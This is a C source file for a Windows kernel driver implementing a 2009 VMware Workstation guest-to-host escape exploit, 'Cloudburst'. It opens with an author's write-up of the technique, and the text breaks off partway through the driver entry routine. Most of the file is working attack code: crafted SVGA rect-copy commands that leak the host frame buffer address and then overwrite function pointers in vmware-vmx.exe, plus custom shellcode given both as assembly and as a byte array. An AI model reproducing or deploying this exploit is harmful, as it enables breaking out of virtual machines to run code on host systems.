/*


	Beyond the Clouds aka CLOUDBURST
	A VMware Guest to Host Escape Exploit
	by Piotr Bania / www.piotrbania.com
	~Sep/2009

	
	Disclaimer
	
	Author takes no responsibility for any actions with provided 
    informations or codes. The copyright for any material created by the 
    author is reserved. Any duplication of codes or texts provided here in 
    electronic or printed publications is not permitted without the author's 
    agreement. 


	About one month or more at Blackhat Las Vegas 2009 Kostya Kortchinsky 
	presented a talk entitled "Cloudburst: Hacking 3D (and Breaking Out of 
	VMware)" [1]. Since he already published his slides [2] and paper [3] I 
	am going to skip most of the introduction parts, additionally I will try 
	to write up my own thoughts on this topic. 

	I spent last few days researching this vulnerability from zero and 
	basically just for fun. Unlike Kostya's method I am able to exploit this 
	vulnerability only by sending two specially crafted SVGA_CMD_RECT_COPY 
	signals. Moreover I have proofed that it is possible to do an arbitrary 
	write not only to the single page before the frame buffer ([2], page 22) 
	- in fact I am overwriting a memory region sometimes located 48 
	megabytes below the actual host frame buffer. Therefore my method does 
	not require any additional VMware options (like svga.yesGlyphs="TRUE") 
	besides the default ones. 

	How the exploit works? 

	The exploit work in three stages: 
	1) locating the frame buffer address 
	2) overwriting the pointers 
	3) meeting the shellcode 

	Step 1: locating the frame buffer address 

	In order to do a memory write on a specified memory address we must know 
	the address of frame buffer inside of the host. This is obvious since 
	all the read/writes addresses will be calculated relatively to the frame 
	buffer address. It appears that the address of frame buffer (pointer to 
	frame buffer) is always written 0xFF99C bytes below it. I can't estimate 
	how much this is reliable but it worked every single time with VMware 
	Workstation 6.5.1 build 126130. 

	Step 2: overwriting the pointers 

	With second SVGA_CMD_RECT_COPY signal (command) we are nuking entire 
	vmware-vmx.exe .data section from 0x00A560FC to the end. It is important 
	to notice that the size parameter passed to memcpy() in this case is 
	always negative so when the rep movsd will reach the bottom of the .data 
	section border it will cause an access violation. Additionally all 
	important (original) data will be overwritten so either way something 
	will fault. How to handle the fault? Read next step. 

	Step 3: meeting the shellcode 

	Shellcode gets executed because other VMware threads use the overwritten 
	function pointers after they are corrupted. For example shellcode can be 
	reached by following procedure: 


	---//SNIP/---------------------------------------------------------------------
	.text:00407C7D                 mov     eax, dword_A560FC
	.text:00407C82                 test    eax, eax
	.text:00407C84                 jz      short loc_407C97
	.text:00407C86                 mov     edx, [ebp+arg_0]
	.text:00407C89                 lea     ecx, [ebp+arg_4]
	.text:00407C8C                 push    ecx
	.text:00407C8D                 push    edx
	.text:00407C8E                 call    eax ; dword_A560FC
	---//SNIP//--------------------------------------------------------------------

	Where EAX leads to our shellcode. Of course there are few others that 
	make use of our corrupted pointers. It appears that the shellcode gets 
	executed before the entire application will fault. To avoid the VMware 
	crash I have developed a custom shellcode which first of all by using 
	native API calls (Windows syscall) de-protects the memory (makes it 
	writable) where KiUserExceptionDispatcher resides. Then it hooks the 
	KiUserExceptionDispatcher and points it to specified procedure. So now 
	when access violation occurs the execution is redirected to the 
	specified shellcode procedure which delays thread execution forever. So 
	in other words all of the vmware-vmx.exe threads will be in zombie 
	state. Additionally it runs calc.exe to visualize the code execution (as 
	shown in the shellcode assembly listing). 

	BONUS - SVGA_CMD_RECT_COPY* address calculation 

	Following disassembly fragment shows how the SOURCE and DESTINATION 
	parameters for memcpy() operations are computed: 


	---//SNIP//--------------------------------------------------------------------
	.text:00679A1A                 mov     ecx, [ebp+const_4]
	.text:00679A1D                 imul    edi, [ebp+srcY] ; edi=bytesPerLine
	.text:00679A21                 imul    eax, edx        ; destY
	.text:00679A24                 add     eax, [ebp+frameBuffer]
	.text:00679A27                 mov     esi, ecx
	.text:00679A29                 imul    esi, [ebp+srcX]
	.text:00679A2D                 add     esi, [ebp+frameBuffer2]
	.text:00679A30                 add     edi, esi
	.text:00679A32                 mov     esi, ecx
	.text:00679A34                 imul    ecx, [ebp+width]
	.text:00679A38                 imul    esi, [ebp+destX]
	.text:00679A3C                 mov     edx, edi        ; src addr
	.text:00679A3E                 add     esi, eax
	---//SNIP//--------------------------------------------------------------------

	Putting it to simple math: 
	read_start_addr = (srcY*bytesPerLine) + (const_4*srcX) + frame_buffer_addr 
	write_start_addr = (destY*bytesPerLine)+(const_4*destX)+frame_buffer_addr 

	As you can see by knowing the frame buffer address it is fairly easy to 
	calculate the wanted address. To make the calculation simpler you can 
	reduce on of its ingredients for example by forcing srcY to be zero. 
	Then entire computation relies only on the frame buffer address and 
	srcX/destY respectively. 

	Of course there are some additional checks that need to be bypassed 
	before the execution will reach the procedure shown before. The most 
	important ones are: 

	1) (Width > 0) && (Height > 0)
	2) (srcX >= screenStartX) && ((srcX + Width) <= (screenStartX+ScreenWidth))

	Greetings (random order): spender, Silvio, pi3, hackerfantastic, 
	bajkero, snup, ducer, Kostya (for finding a great 
	vulnerability) and all the guys i forgot to mention
	
	
	P.S Most of the SVGA communication procedures (perhaps little modified) 
	here are taken from Micah Dowty. Actually all the communication 
	initialization procedures can be bypassed/reduced by using mapping the 
	FIFO and FB directly through MmMapIoSpace or VideoPortMapMemory (this 
	one requires one additional parameter - HwDeviceExtension). Of course 
	both of those functions require the knowledge of bus-relative base 
	address of the range to be mapped, however this should be available by 
	looking into windows registry or system configuration (see [2] for 
	details). Additionally you can hook some of the functions which does the 
	same actions in the vmx_svga.sys driver. I have implemented this exploit 
	in various ways and it worked perfectly. 

	Following exploit was tested only on Windows XP SP3 with VMware 
	Workstation 6.5.1 build 126130 with no DEP support :( 

	
	* - and not only

	[1] http://www.blackhat.com/html/bh-usa-09/bh-usa-09-speakers.html#thumb
	[2] http://www.blackhat.com/presentations/bh-usa-09/KORTCHINSKY/BHUSA09-Kortchinsky-Cloudburst-SLIDES.pdf
	[3] http://www.blackhat.com/presentations/bh-usa-09/KORTCHINSKY/BHUSA09-Kortchinsky-Cloudburst-PAPER.pdf
	
	
	

	
	04:42 <spender> i'm trying to stick a duck to my head
	04:43 <spender> success
	04:43 <spender> oh
	04:43 <spender> one
	04:43 <spender> 2
	04:43 <spender> 3
	04:43 <spender> 4
	04:43 <spender> 5
	04:43 <spender> 6
	04:43 <spender> 7
	04:43 <spender> 8
	04:43 <spender> 9
	04:43 <spender> 10
	04:43 <spender> 11
	04:44 <spender> 12
	04:44 <spender> 13
	04:44 <spender> 14
	04:44 <spender> 15
	04:44 <spender> 16
	04:44 <spender> 17
	04:44 <spender> 18
	04:44 <spender> damn
	04:44 <spender> 18 seconds
	04:44 <spender> the duck won't stick to my head any longer

	- yeah after all those years we still do it for the lulz xD	

	
	
	* SECURITYFOCUS ET. AL. YOU ARE NOT ALLOWED TO REPUBLISH/EDIT/USE THIS THING
	ON YOUR OWN WEBSITE. 
	
*/






#include <stdio.h>
#include <ntddk.h>
#include <windef.h>

#include "driver.h"




// ----- some header data ----------------------------------------------------------------

#define DEST_ADDR			0x00A560FC
#define DEST_ADDR_END		0x00A5612C	
#define DEST_ADDR_RET		DEST_ADDR_END+4

#define srcXXX				(ULONG)((DEST_ADDR - fb_host_addr)/4)


#define TRUE					1
#define FALSE					0

#define MIN(a, b)				((a) < (b) ? (a) : (b))
#define MAX(a, b)				((a) > (b) ? (a) : (b))

#define SVGA_Panic(x)			{ DbgPrint(x"\n"); return; }
#define SVGAFIFOFull()			{ DbgPrint("SVGAFIFOFull\n"); _asm { int 3 }; }


typedef ULONG			CARD32;
typedef unsigned short	uint16;
typedef unsigned char	uint8;
typedef unsigned long	uint32;
typedef int				int32;
typedef uint8 Bool;

#define offsetof(type, member)  ((uint32)(&((type*)NULL)->member))

#define PCI_VENDOR_ID_VMWARE            0x15AD
#define PCI_DEVICE_ID_VMWARE_SVGA2      0x0405



#define SVGA_ID_INVALID    0xFFFFFFFF

/* Port offsets, relative to BAR0 */
#define SVGA_INDEX_PORT         0x0
#define SVGA_VALUE_PORT         0x1
#define SVGA_BIOS_PORT          0x2
#define SVGA_IRQSTATUS_PORT     0x8


#define PCI_REG_CONFIG_ADDRESS  0xCF8
#define PCI_REG_CONFIG_DATA     0xCFC


#define SVGA_FB_MAX_TRACEABLE_SIZE      0x1000000

#define SVGA_MAX_PSEUDOCOLOR_DEPTH      8
#define SVGA_MAX_PSEUDOCOLORS           (1 << SVGA_MAX_PSEUDOCOLOR_DEPTH)
#define SVGA_NUM_PALETTE_REGS           (3 * SVGA_MAX_PSEUDOCOLORS)

#define SVGA_MAGIC						 0x900000UL
#define SVGA_MAKE_ID(ver)				(SVGA_MAGIC << 8 | (ver))

#define PCI_MAX_BUSSES					0x20


#pragma pack(push, 1)
typedef union PCIConfigSpace {
   uint32 words[16];
   struct {
      uint16 vendorId;
      uint16 deviceId;
      uint16 command;
      uint16 status;
      uint16 revisionId;
      uint8  subclass;
      uint8  classCode;
      uint8  cacheLineSize;
      uint8  latTimer;
      uint8  headerType;
      uint8  BIST;
      uint32 BAR[6];
      uint32 cardbusCIS;
      uint16 subsysVendorId;
      uint16 subsysId;
      uint32 expansionRomAddr;
      uint32 reserved0;
      uint32 reserved1;
      uint8  intrLine;
      uint8  intrPin;
      uint8  minGrant;
      uint8  maxLatency;
   };
} PCIConfigSpace;
#pragma pack(pop)


typedef struct PCIAddress {
   uint8 bus, device, function;
} PCIAddress;

typedef struct PCIScanState {
   uint16     vendorId;
   uint16     deviceId;
   PCIAddress nextAddr;
   PCIAddress addr;
} PCIScanState;


typedef struct SVGADevice {
   PCIAddress pciAddr;
   uint32     ioBase;
   uint32    *fifoMem;
   uint8     *fbMem;
   uint32     fifoSize;
   uint32     fbSize;

   uint32     deviceVersionId;
   uint32     capabilities;

   uint32     width;
   uint32     height;
   uint32     bpp;
   uint32     pitch;

   /* // waste of space
   struct {
      uint32  reservedSize;
      Bool    usingBounceBuffer;
      uint8   bounceBuffer[1024 * 1024];
      uint32  nextFence;
   } fifo;

   struct {
      uint32        pending;
      uint32        switchContext;
      IntrContext   oldContext;
      IntrContext   newContext;
      uint32        count;
   } irq;
	*/
} SVGADevice;

#include "svga_reg.h"

// ---- end of some header data ----------------------------------------------------------


// ---- shellcode ------------------------------------------------------------------------

/* this is custom Windows XP SP3 shellcode created by me, the source should be 
self-explanatory:

	KiUserExceptionDispatcher_RVA		equ 0E47Ch		; win xp sp3
	NtProtectVirtualMemory_SN			equ 89h			; syscall number
	NtDelayExecution_SN					equ 3bh  	


	call	delt
delt: 		pop ebp
			sub ebp,offset delt


	xor		eax,eax
	mov		edx,1
	lock 	cmpxchg dword ptr [ebp+busy_flag],edx
	jnz		hook_KiUserExceptionDispatcher

	mov 	eax,dword ptr fs:[30h]					; PEB
	mov 	eax,dword ptr [eax+0ch]					; PEB_LDR_DATA
	mov		eax,dword ptr [eax+1ch]
	mov		ebx,[eax+8h]							; NTDLL.DLL base
	add		ebx,KiUserExceptionDispatcher_RVA		; ebx = VA of KiUserExceptionDispatcher


	; prepare the memory for patching

	mov	dword ptr [ebp+base_a],ebx
	and	esp,not 4
	call	p1
			dd	0						; OldAccessProtection
p1:
	push	PAGE_EXECUTE_READWRITE
	call	p2
			dd	5						; NumberOfBytesToProtect
p2:	
	call	p3
	base_a	dd	0						; *BaseAddress
p3:	
	push	-1
	lea		edx,[ebp+offset ret1]
	push	edx
	push	edx
	mov		edx,esp
	mov		eax,NtProtectVirtualMemory_SN		
	db		0Fh,34h						; sysenter
ret1:

	; patch it
	mov		byte ptr [ebx],0E9h
	mov		ecx,ebx
	lea		edx,[ebp+hook_KiUserExceptionDispatcher-5]
	sub		edx,ecx
	mov		dword ptr [ebx+1],edx

	; real shellcode here
	; same shit but this time we are hunting for KERNEL32.DLL base

	mov 	eax,dword ptr fs:[30h]				; PEB
	mov 	eax,dword ptr [eax+0ch]				; PEB_LDR_DATA
	mov		eax,dword ptr [eax+1ch]
	mov 	eax,[eax]
	mov		esi,[eax+8h]						; KERNEL32.DLL base
	mov		ebx,[esi+3Ch]						; EBX=PEH
	add		ebx,esi

	mov 	edx,[ebx+078h]						; export section RVA
	add 	edx,esi								; normalize

	xor 	ebx,ebx								; counter
	mov 	ecx,[edx+020h]						; address of names
	add 	ecx,esi 							; normalize

	mov 	eax,[edx+01ch]						; address of functions
	add 	eax,esi	                			; normalize

	mov		edi,[edx+018h]						; number of names

	push	ebp
	mov		ebp,[edx+024h]							; address of ordinals
	add		ebp,esi

	
loop_it:
	mov 	edx,[ecx]							; get one name
	add 	edx,esi		      					; normalize, EDX=name
	

	; now take the ordinal of this one
	push 	eax
	push	ebx
	mov		bx,word ptr [ebp+ebx*2]
	and		ebx,0000ffffh
	
	; get export address	
	mov		eax,[eax+ebx*4]
	add		eax,esi									; EAX=function addr
		
	; name check
	cmp		dword ptr [edx],'EniW'	; WinExec?
	je		make_calc

	pop		ebx
	pop 	eax
		
next_one:
	add 	ecx,4
	inc		ebx
	dec		edi
	jnz		loop_it
	pop		ebp
	jmp		hook_KiUserExceptionDispatcher


	; EAX = WinExec addr
make_calc:
	add		esp,8
	pop		ebp

	push 	SW_SHOW
	@pushsz "calc.exe"
	call	eax

	; go to sleep bitch
hook_KiUserExceptionDispatcher:
	mov	ebx,esp

	call	interval
	dd		7fffffffh						; jdsfj dsfhdfg dfk
	dd		7fffffffh

interval:
	push	0
	lea		edx,[ebp+offset ret2]
	push	edx
	push	edx
	mov		edx,esp
	mov		eax,NtDelayExecution_SN		
	db		0Fh,34h							; sysenter
ret2:

	; meet the b0z0
	mov		ecx,7fffffffh
l1:
	db		100 dup (90h)
	loop	l1

	mov		esp,ebx
	jmp		hook_KiUserExceptionDispatcher

busy_flag	dd 0


*/

unsigned char sdata[389] = {
	0xE8, 0x00, 0x00, 0x00, 0x00, 0x5D, 0x81, 0xED, 0x0A, 0x10, 0x40, 0x00, 0x33, 0xC0, 0xBA, 0x01, 
	0x00, 0x00, 0x00, 0xF0, 0x0F, 0xB1, 0x95, 0x86, 0x11, 0x40, 0x00, 0x0F, 0x85, 0xCC, 0x00, 0x00, 
	0x00, 0x64, 0x67, 0xA1, 0x30, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x1C, 0x8B, 0x58, 0x08, 0x81, 
	0xC3, 0x7C, 0xE4, 0x00, 0x00, 0x89, 0x9D, 0x5C, 0x10, 0x40, 0x00, 0x83, 0xE4, 0xFB, 0xE8, 0x04, 
	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6A, 0x40, 0xE8, 0x04, 0x00, 0x00, 0x00, 0x05, 0x00, 
	0x00, 0x00, 0xE8, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x6A, 0xFF, 0x8D, 0x95, 0x73, 
	0x10, 0x40, 0x00, 0x52, 0x52, 0x8B, 0xD4, 0xB8, 0x89, 0x00, 0x00, 0x00, 0x0F, 0x34, 0xC6, 0x03, 
	0xE9, 0x8B, 0xCB, 0x8D, 0x95, 0xED, 0x10, 0x40, 0x00, 0x2B, 0xD1, 0x89, 0x53, 0x01, 0x64, 0x67, 
	0xA1, 0x30, 0x00, 0x8B, 0x40, 0x0C, 0x8B, 0x40, 0x1C, 0x8B, 0x00, 0x8B, 0x70, 0x08, 0x8B, 0x5E, 
	0x3C, 0x03, 0xDE, 0x8B, 0x53, 0x78, 0x03, 0xD6, 0x33, 0xDB, 0x8B, 0x4A, 0x20, 0x03, 0xCE, 0x8B, 
	0x42, 0x1C, 0x03, 0xC6, 0x8B, 0x7A, 0x18, 0x55, 0x8B, 0x6A, 0x24, 0x03, 0xEE, 0x8B, 0x11, 0x03, 
	0xD6, 0x50, 0x53, 0x66, 0x8B, 0x5C, 0x5D, 0x00, 0x81, 0xE3, 0xFF, 0xFF, 0x00, 0x00, 0x8B, 0x04, 
	0x98, 0x03, 0xC6, 0x81, 0x3A, 0x57, 0x69, 0x6E, 0x45, 0x74, 0x0C, 0x5B, 0x58, 0x83, 0xC1, 0x04, 
	0x43, 0x4F, 0x75, 0xD9, 0x5D, 0xEB, 0x16, 0x83, 0xC4, 0x08, 0x5D, 0x6A, 0x05, 0xE8, 0x09, 0x00, 
	0x00, 0x00, 0x63, 0x61, 0x6C, 0x63, 0x2E, 0x65, 0x78, 0x65, 0x00, 0xFF, 0xD0, 0x8B, 0xDC, 0xE8, 
	0x08, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0x7F, 0xFF, 0xFF, 0xFF, 0x7F, 0x6A, 0x00, 0x8D, 0x95, 
	0x14, 0x11, 0x40, 0x00, 0x52, 0x52, 0x8B, 0xD4, 0xB8, 0x3B, 0x00, 0x00, 0x00, 0x0F, 0x34, 0xB9, 
	0xFF, 0xFF, 0xFF, 0x7F, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 
	0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90, 0xE2, 0x9A, 0x8B, 0xE3, 0xE9, 0x6C, 0xFF, 0xFF, 
	0xFF, 0x00, 0x00, 0x00, 0x00
};

// ---- end of shellcode -----------------------------------------------------------------




// ---- globals --------------------------------------------------------------------------
 
PDRIVER_OBJECT			pdoGlobalDrvObj = 0;
VOID					DriverUnload(PDRIVER_OBJECT pDriverObject);
NTSTATUS				DriverUnsupported(PDEVICE_OBJECT, PIRP);

SVGADevice				gSVGA;

// ---- end of globals -------------------------------------------------------------------



// ---- some SVGA functions --------------------------------------------------------------

static _inline void IO_Out8(uint16 port, uint8 value)
{
	_asm
	{
		mov dx,port
		mov al,value
		out dx,al
	}
}

static _inline void IO_Out16(uint16 port, uint16 value)
{
	_asm
	{
		mov dx,port
		mov ax,value
		out dx,ax
	}
}

static _inline void IO_Out32(uint16 port, uint32 value)
{
 	_asm
	{
		mov dx,port
		mov eax,value
		out dx,eax
	}
}

static _inline uint8 IO_In8(uint16 port)
{
	uint8 value;
	_asm
	{
		mov	dx,port
		in	al,dx
		mov	byte ptr [value],al
	}
   return value;
}

static _inline uint16 IO_In16(uint16 port)
{
   uint16 value;
	_asm
	{
		mov	dx,port
		in	ax,dx
		mov	word ptr [value],ax
	}
   return value;
}

static _inline uint32 IO_In32(uint16 port)
{
   uint32 value;
	_asm
	{
		mov	dx,port
		in	eax,dx
		mov	dword ptr [value],eax
	}
   return value;
}



static uint32 PCIConfigPackAddress(const PCIAddress *addr, uint16 offset)
{
   const uint32 enableBit = 0x80000000UL;

   return (((uint32)addr->bus << 16) |
           ((uint32)addr->device << 11) |
           ((uint32)addr->function << 8) |
           offset | enableBit);
}


_inline uint32 PCI_ConfigRead32(const PCIAddress *addr, uint16 offset)
{
   IO_Out32(PCI_REG_CONFIG_ADDRESS, PCIConfigPackAddress(addr, offset));
   return IO_In32(PCI_REG_CONFIG_DATA);
}

_inline  uint16 PCI_ConfigRead16(const PCIAddress *addr, uint16 offset)
{
   IO_Out32(PCI_REG_CONFIG_ADDRESS, PCIConfigPackAddress(addr, offset));
   return IO_In16(PCI_REG_CONFIG_DATA);
}

_inline uint8 PCI_ConfigRead8(const PCIAddress *addr, uint16 offset)
{
   IO_Out32(PCI_REG_CONFIG_ADDRESS, PCIConfigPackAddress(addr, offset));
   return IO_In8(PCI_REG_CONFIG_DATA);
}

_inline void PCI_ConfigWrite32(const PCIAddress *addr, uint16 offset, uint32 data)
{
   IO_Out32(PCI_REG_CONFIG_ADDRESS, PCIConfigPackAddress(addr, offset));
   IO_Out32(PCI_REG_CONFIG_DATA, data);
}

_inline void PCI_ConfigWrite16(const PCIAddress *addr, uint16 offset, uint16 data)
{
   IO_Out32(PCI_REG_CONFIG_ADDRESS, PCIConfigPackAddress(addr, offset));
   IO_Out16(PCI_REG_CONFIG_DATA, data);
}

_inline void PCI_ConfigWrite8(const PCIAddress *addr, uint16 offset, uint8 data)
{
   IO_Out32(PCI_REG_CONFIG_ADDRESS, PCIConfigPackAddress(addr, offset));
   IO_Out8(PCI_REG_CONFIG_DATA, data);
}



int PCI_ScanBus(PCIScanState *state)
{
   PCIConfigSpace config;

   for (;;) {
      config.words[0] = PCI_ConfigRead32(&state->nextAddr, 0);

      state->addr = state->nextAddr;

      if (++state->nextAddr.function == 0x8) {
         state->nextAddr.function = 0;
         if (++state->nextAddr.device == 0x20) {
            state->nextAddr.device = 0;
            if (++state->nextAddr.bus == PCI_MAX_BUSSES) {
               return FALSE;
            }
         }
      }

      if (config.words[0] != 0xFFFFFFFFUL) {
         state->vendorId = config.vendorId;
         state->deviceId = config.deviceId;
         return TRUE;
      }
   }
}



int PCI_FindDevice(uint16 vendorId, uint16 deviceId, PCIAddress *addrOut)
{
   PCIScanState busScan;

   while (PCI_ScanBus(&busScan)) {
      if (busScan.vendorId == vendorId && busScan.deviceId == deviceId) {
         *addrOut = busScan.addr;
         return TRUE;
      }
   }

   return FALSE;
}

void PCI_SetBAR(const PCIAddress *addr, int index, uint32 value)
{
   PCI_ConfigWrite32(addr, offsetof(PCIConfigSpace, BAR[index]), value);
}

_inline uint32 PCI_GetBARAddr(const PCIAddress *addr, int index)
{
   return PCI_ConfigRead32(addr, offsetof(PCIConfigSpace, BAR[index])) & ~3;
}

void PCI_SetMemEnable(const PCIAddress *addr, int enable)
{
   uint16 command = PCI_ConfigRead16(addr, offsetof(PCIConfigSpace, command));

   const uint16 flags = 0x0007;

   if (enable) {
      command |= flags;
   } else {
      command &= ~flags;
   }

   PCI_ConfigWrite16(addr, offsetof(PCIConfigSpace, command), command);
}

uint32 SVGA_ReadReg(uint32 index)  // IN
{
   IO_Out32(gSVGA.ioBase + SVGA_INDEX_PORT, index);
   return IO_In32(gSVGA.ioBase + SVGA_VALUE_PORT);
}


void
SVGA_WriteReg(uint32 index,  // IN
              uint32 value)  // IN
{
   IO_Out32(gSVGA.ioBase + SVGA_INDEX_PORT, index);
   IO_Out32(gSVGA.ioBase + SVGA_VALUE_PORT, value);
}

Bool
SVGA_HasFIFOCap(int cap)
{
   return (gSVGA.fifoMem[SVGA_FIFO_CAPABILITIES] & cap) != 0;
}

void vmwareWaitForFB(void)
{
    SVGA_WriteReg(SVGA_REG_SYNC, 1);
    while (SVGA_ReadReg(SVGA_REG_BUSY));
}


void VMwareWriteWordToFIFO(CARD32 value)
{
    CARD32* vmwareFIFO = gSVGA.fifoMem;

    /* Need to sync? */
    if ((vmwareFIFO[SVGA_FIFO_NEXT_CMD] + sizeof(CARD32) == vmwareFIFO[SVGA_FIFO_STOP])
     || (vmwareFIFO[SVGA_FIFO_NEXT_CMD] == vmwareFIFO[SVGA_FIFO_MAX] - sizeof(CARD32) &&
	 vmwareFIFO[SVGA_FIFO_STOP] == vmwareFIFO[SVGA_FIFO_MIN])) {
        DbgPrint(("Syncing because of full fifo\n"));
        vmwareWaitForFB();
    }

    vmwareFIFO[vmwareFIFO[SVGA_FIFO_NEXT_CMD] / sizeof(CARD32)] = value;
    if(vmwareFIFO[SVGA_FIFO_NEXT_CMD] == vmwareFIFO[SVGA_FIFO_MAX] -
       sizeof(CARD32)) {
        vmwareFIFO[SVGA_FIFO_NEXT_CMD] = vmwareFIFO[SVGA_FIFO_MIN];
    } else {
        vmwareFIFO[SVGA_FIFO_NEXT_CMD] += sizeof(CARD32);
    }
}


// ---- end of some SVGA functions -------------------------------------------------------


// ---- owning functions -----------------------------------------------------------------

ULONG get_framebuffer_base(void)
{
	ULONG					fb_base;
	SVGAFifoCmdRectCopy		rect;
	unsigned char			*fb;


	// write the correct resolution
	SVGA_WriteReg(SVGA_REG_WIDTH, 0x320);
	SVGA_WriteReg(SVGA_REG_HEIGHT, 0x258);

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, 0 );

	fb			=	(unsigned char*)gSVGA.fbMem;
	memset(fb,'A',sizeof(ULONG)*2);		//	just as a marker


	/*

	Following values are provided because we want to read the data before the actual frame buffer. 
	I don't know if this is much reliable but it seems that in VMware Workstation 6.5.1 build 126130
	the frame buffer address (address where it is mapped in the host) is located 0xff99c bytes
	from actual frame buffer. So by doing simple calculations we force VMware to read this value and
	return it to the frame buffer. We will later read this in the virtualized environment. 


	This is only correct for:
	SVGA_REG_WIDTH			-> 00000320
	SVGA_REG_HEIGHT			-> 00000258
	SVGA_REG_BYTES_PER_LINE -> 00000c80


	*/
 

	rect.srcX	= 0x3FFC0199; 
	rect.srcY	= 0x0; 
	rect.destX	= 0x1;
	rect.destY	= 0x0;
	rect.width	= 0x4fffffff; 
	rect.height = 0x2;

	VMwareWriteWordToFIFO(SVGA_CMD_RECT_COPY);
	VMwareWriteWordToFIFO(rect.srcX);
	VMwareWriteWordToFIFO(rect.srcY);
	VMwareWriteWordToFIFO(rect.destX);
	VMwareWriteWordToFIFO(rect.destY);
	VMwareWriteWordToFIFO(rect.width);
	VMwareWriteWordToFIFO(rect.height);

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, 1 );
	vmwareWaitForFB();

	fb_base	=	*(ULONG*)(fb+4);
	if ((fb_base == 0) || (fb_base >= 0x80000000) || (fb_base == 'AAAA'))
	{
		DbgPrint("Error: Fatal get_framebuffer_base() returned %08x\n",fb_base);
		return 0;
	}

	DbgPrint("get_framebuffer_base() = %08x\n",fb_base);
	return fb_base;
}


void overwrite_mem(ULONG fb_host_addr)
{
	ULONG					i;
	SVGAFifoCmdRectCopy		rect;
	unsigned char			*fb;


	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, 0 );

	fb				=	(unsigned char*)gSVGA.fbMem;
	memset(fb,0x90,sizeof(ULONG)*800*600);		//	just as a marker

	// spit the return address all over the pointers
	for (i = 0; i < ((DEST_ADDR_RET+4)-DEST_ADDR); i+=4)
		*(ULONG*)(fb+i) = DEST_ADDR_RET;

	// write shellcode
	memcpy((void*)(fb+i),&sdata,sizeof(sdata));

	// I got bullets that'll rip through your ribs
	// More painful than watching R. Kelly piss on your kids
	
	rect.srcX	= 0x1; 
	rect.srcY	= 0x0; 
	rect.destX	= srcXXX;
	rect.destY	= 0x0;
	rect.width	= 0x7fffffff; 
	rect.height = 0x2;
	
	VMwareWriteWordToFIFO(SVGA_CMD_RECT_COPY);
	VMwareWriteWordToFIFO(rect.srcX);
	VMwareWriteWordToFIFO(rect.srcY);
	VMwareWriteWordToFIFO(rect.destX);
	VMwareWriteWordToFIFO(rect.destY);
	VMwareWriteWordToFIFO(rect.width);
	VMwareWriteWordToFIFO(rect.height);

	SVGA_WriteReg(SVGA_REG_CONFIG_DONE, 1 );
	vmwareWaitForFB();
}


void exploit_svga(void)
{
	ULONG	fb_host_addr;
	
	fb_host_addr = get_framebuffer_base();	
	if ((ULONG)fb_host_addr == 0)
	{
		DbgPrint("Exploitation failed!\n");
		return;
	}

	// boink!
	overwrite_mem(fb_host_addr);
}


void SVGA_Init_and_Exploit(void)
{
	PHYSICAL_ADDRESS	phys;
	PHYSICAL_ADDRESS	phys_fb;
	PVOID				phys_fifo_low;
	PVOID				phys_fb_low;

	if (!PCI_FindDevice(PCI_VENDOR_ID_VMWARE, PCI_DEVICE_ID_VMWARE_SVGA2,&gSVGA.pciAddr)) 
	{
		DbgPrint("Error: No VMware SVGA device found.");
		return;
	}


	PCI_SetMemEnable(&gSVGA.pciAddr, TRUE);
	gSVGA.ioBase		=	PCI_GetBARAddr(&gSVGA.pciAddr, 0);
	phys_fb_low			=	(PVOID)PCI_GetBARAddr(&gSVGA.pciAddr, 1);
	phys_fifo_low		=	(PVOID)PCI_GetBARAddr(&gSVGA.pciAddr, 2);

	gSVGA.fbSize		= SVGA_ReadReg(SVGA_REG_FB_SIZE);
	gSVGA.fifoSize		= SVGA_ReadReg(SVGA_REG_MEM_SIZE);

	phys.HighPart		= 0;
	phys.LowPart		= (ULONG)phys_fifo_low;

	phys_fb.HighPart	= 0;
	phys_fb.LowPart		= (ULONG)phys_fb_low;


	// map
	gSVGA.fifoMem		= (void*)MmMapIoSpace(phys,gSVGA.fifoSize,MmNonCached);
	gSVGA.fbMem			= (void*)MmMapIoSpace(phys_fb,gSVGA.fbSize,MmNonCached);
	

	if ((gSVGA.fifoMem == NULL) || (gSVGA.fbMem == NULL))
	{
		DbgPrint("* Fatal Unable to map memory!\n");
		return;
	}

	
	// exploit it
	exploit_svga();

	// unmap
	MmUnmapIoSpace(gSVGA.fifoMem,gSVGA.fifoSize);
	MmUnmapIoSpace(gSVGA.fbMem,gSVGA.fbSize);

}




NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, IN PUNICODE_STRING RegistryPath)
{  
	int				i;
	NTSTATUS		NtStatus;
  	PDEVICE_OBJECT	pdoDeviceObj = 0;
	NTSTATUS		status;
	
	pdoGlobalDrvObj = DriverObject;

	if(!NT_SUCCESS(status = IoCreateDevice(
		DriverObject,
		0,
		&usDeviceName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN,
		FALSE,
		&pdoDeviceObj
		)))
	{
		return status;
	};

	
	if(!NT_SUCCESS(status = IoCreateSymbolicLink(
		&usSymlinkName,
		&usDeviceName
		)))
	{
		IoDeleteDevice(pdoDeviceObj);
		return status;
	}


  	for(i=0;i<IRP_MJ_MAXIMUM_FUNCTION;i++)
